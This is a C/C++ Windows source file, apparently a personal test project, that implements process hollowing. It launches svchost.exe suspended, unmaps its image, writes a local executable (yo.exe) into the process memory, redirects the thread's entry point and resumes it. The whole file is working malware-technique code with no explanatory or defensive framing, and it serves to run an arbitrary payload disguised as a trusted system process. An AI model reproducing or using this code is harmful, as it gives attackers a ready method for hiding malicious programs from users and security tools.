#include <stdio.h>
#include "helper.h"
#include <windows.h>
#include <wdbgexts.h>

int main()
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	if (!CreateProcess("C:\\Windows\\System32\\svchost.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
	{
		printf("CreateProcess Failed (%d).\n", GetLastError());
	}


	HINSTANCE handleToRemoteNtDll = LoadLibrary("ntdll");

	FARPROC fpNtQueryInformationProcess = GetProcAddress(handleToRemoteNtDll, "NtQueryInformationProcess");
	FARPROC fpZwUnmapViewOfSection = GetProcAddress(handleToRemoteNtDll, "ZwUnmapViewOfSection");

	_NtQueryInformationProcess NtQueryInformationProcess = (_NtQueryInformationProcess)fpNtQueryInformationProcess;
	_ZwUnmapViewOfSection ZwUnmapViewOfSection = (_ZwUnmapViewOfSection)fpZwUnmapViewOfSection;


	PROCESS_BASIC_INFORMATION pbi;
	PULONG returnLen = NULL;


	NtQueryInformationProcess(
		pi.hProcess,
		ProcessBasicInformation,
		&pbi,
		sizeof(pbi),
		returnLen
	);

	// GET PEB Info
	PEB* peb = new PEB();
	ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress, peb, sizeof(PEB), 0);

	ZwUnmapViewOfSection(pi.hProcess, peb->ImageBaseAddress);


	LPOFSTRUCT lpReOpenBuff;
	HANDLE hFileYo = CreateFileA("C:\\Users\\pip\\Desktop\\yo.exe", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	HANDLE handleMappingYo = CreateFileMappingA(hFileYo, NULL, PAGE_READWRITE, 0, 0, NULL);
	LPVOID lpBaseYo = MapViewOfFile(handleMappingYo, FILE_MAP_ALL_ACCESS, 0, 0, 0);



	PIMAGE_DOS_HEADER dosHeaderYo = (PIMAGE_DOS_HEADER)lpBaseYo;
	PIMAGE_NT_HEADERS pNTHeaderYo = (PIMAGE_NT_HEADERS)((DWORD)dosHeaderYo + (DWORD)dosHeaderYo->e_lfanew);

	LPVOID lpVMem = VirtualAllocEx(pi.hProcess, peb->ImageBaseAddress, pNTHeaderYo->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	
	printf("Image Base Address %x\n", peb->ImageBaseAddress);
	printf("Source Base Address %x\n", pNTHeaderYo->OptionalHeader.ImageBase);
	//pNTHeaderYo->OptionalHeader.ImageBase = (DWORD)peb->ImageBaseAddress;

	

	BYTE* headerBuffer = new BYTE[pNTHeaderYo->OptionalHeader.SizeOfHeaders];

	memcpy(headerBuffer, dosHeaderYo, pNTHeaderYo->OptionalHeader.SizeOfHeaders);


	if (!WriteProcessMemory(pi.hProcess, peb->ImageBaseAddress, headerBuffer, pNTHeaderYo->OptionalHeader.SizeOfHeaders, NULL))
	{
		printf("Failed: Unable to write headers");
		return -1;
	}

	
	PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(pNTHeaderYo);

	for (int i = 0; i < pNTHeaderYo->FileHeader.NumberOfSections; i++)
	{
		BYTE* section = new BYTE[(DWORD)sectionHeader->SizeOfRawData];
		memcpy(section, (const void *)((DWORD)dosHeaderYo + (DWORD)sectionHeader->PointerToRawData), (DWORD)sectionHeader->SizeOfRawData);

		printf("Copying data from: %s\n", sectionHeader->Name);

		if (!WriteProcessMemory(pi.hProcess, (LPVOID)((DWORD)peb->ImageBaseAddress + (DWORD)sectionHeader->VirtualAddress), section, (DWORD)sectionHeader->SizeOfRawData, NULL))
		{
			printf("Failed: %i", GetLastError());
			return -1;
		}
		sectionHeader++;
	}


	printf("Created Process id: %i\n", pi.dwProcessId);
	PCONTEXT lpContext = new CONTEXT();
	lpContext->ContextFlags = CONTEXT_INTEGER;
	GetThreadContext(pi.hThread, lpContext);
	lpContext->Eax = (DWORD)peb->ImageBaseAddress + (DWORD)pNTHeaderYo->OptionalHeader.AddressOfEntryPoint;

	printf("EAX: %x\n", lpContext->Eax);
	SetThreadContext(
		pi.hThread,
		lpContext
	);

	ResumeThread(
		pi.hThread
	);

	printf("Created Process id: %i\n", pi.dwProcessId);
	printf("Size of Image: %u\n", pNTHeaderYo->OptionalHeader.SizeOfImage);
	printf("Created Process PebBaseAddress: 0x%x\n", pbi.PebBaseAddress);

	return 0;
}